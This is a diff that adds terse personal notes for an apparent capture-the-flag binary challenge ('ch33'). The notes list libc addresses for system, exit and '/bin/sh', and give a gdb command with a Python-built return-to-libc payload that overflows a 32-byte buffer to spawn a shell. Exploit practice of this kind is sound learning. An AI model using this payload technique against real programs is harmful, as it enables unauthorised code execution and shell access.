@@ -1,0 +1,13 @@
+system : f7e44850
+exit : f7e386c0
+binsh : ffffd298
+
+
+SHELCODE : padding &system &exit   &/bins/sh
+
+
+system : b7e690b0
+binsh : bffffc08
+real : bffffbf8
+
+gdb --args ./ch33 $(python -c 'print "A"*32 + "\xb0\x90\xe6\xb7" + "EXIT" + "\x18\xfc\xff\xbf" "/bin/sh"')
